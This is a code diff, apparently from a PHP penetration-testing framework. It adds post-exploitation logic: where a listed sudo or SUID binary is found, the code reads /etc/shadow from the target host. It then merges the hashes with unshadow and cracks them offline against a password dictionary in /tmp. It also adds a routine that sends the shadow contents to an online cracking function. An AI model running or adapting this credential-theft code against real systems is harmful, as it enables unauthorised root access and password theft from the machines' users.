@@ -886,9 +886,23 @@ This can be used to help determine the OS running and the last time it's been fu
                 
                 $this->lan2pentest8id($template_id_test);$this->pause();
             }
+            if (in_array($obj_suid->file_name, $this->tab_sudo8app2read) ) {
+                $file2read = "/etc/shadow";
+                $cmd_data = $obj_suid->elf4root2read($sudo,$userpass, $file2read);
+                $shadow_str = $this->req_str($this->stream, $cmd_data, $this->stream_timeout);
+                $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
+            }
    }
  
     public function lan2root8shadow($shadow_str,$password_str){
+        $this->titre(__FUNCTION__);
+        $this->lan2root8shadow8online($shadow_str);
+        $this->lan2root8shadow8local($shadow_str,$password_str);
+        
+    }
+
+    
+    public function lan2root8shadow8local($shadow_str,$password_str){
         $this->ssTitre(__FUNCTION__);
         
         file_put_contents("/tmp/$this->ip.$this->port.$this->protocol.shadow", $shadow_str);
@@ -896,18 +910,21 @@ This can be used to help determine the OS running and the last time it's been fu
         
         $unshadow_file = "/tmp/$this->ip.$this->port.$this->protocol.unshadow";
         $this->requette("unshadow '/tmp/$this->ip.$this->port.$this->protocol.passwd'  '/tmp/$this->ip.$this->port.$this->protocol.shadow'  > $unshadow_file");
-        $dico = "$this->dir_tools/dico/password.dico.10k"  ;
+        $dico = "$this->dir_tools/dico/password.dico.tmp"  ;
         if (!$this->ip2root8db($this->ip2id)){
-        if ($this->ip2crack($unshadow_file,$dico)==="1") {
-            $this->note("Cracking unshadow already done");
-            
-        }
+            if ($this->ip2crack($unshadow_file,$dico)==="1") {
+                $this->note("Cracking unshadow already done");
+                
+            }
         }
         
     }
-
     
-   
+    public function lan2root8shadow8online($shadow_str){
+        $this->ssTitre(__FUNCTION__);
+        $this->shadow2crack8online($shadow_str);
+        
+    }
     
     
     
